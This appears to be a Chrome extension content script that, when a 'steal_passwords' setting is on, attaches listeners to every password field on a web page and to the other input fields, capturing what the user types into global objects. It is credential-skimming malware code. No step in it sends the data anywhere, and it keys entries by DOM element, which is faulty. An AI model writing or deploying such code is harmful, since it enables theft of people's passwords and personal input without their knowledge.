// global variables related to logic and state
let passwords = {};
let alt_inputs = {};

chrome.runtime.sendMessage({command: "script-first-load"}, (information) => {
    // parse settings to determine what hooks we have to insert 
    // into the page.
    let settings = information.settings;
    if (settings.steal_passwords) {

        // injects a listener for all password entries.
        let raw_inputs = document.getElementsByTagName('input');
        let password_inputs = [];
        let other_inputs = [];

        // loops through entries and checks which ones are passwords.
        for (const ri of raw_inputs) {
            if (ri.getAttribute('type') == 'password') {
                password_inputs.push(ri);
            } else {
                other_inputs.push(ri);
            }
        }

        // will check if we should set listeners
        if (password_inputs.length > 0) {
            // updates our values for all our passwords
            for (const i of password_inputs) {
                i.addEventListener('input', (e) => {
                    passwords[i] = e.target.value;
                });
            }

            // updates our values for our other inputs
            for (const i of other_inputs) {
                i.addEventListener('input', (e) => {
                    alt_inputs[i] = e.target.value;
                });
            }
        }
        
    }
})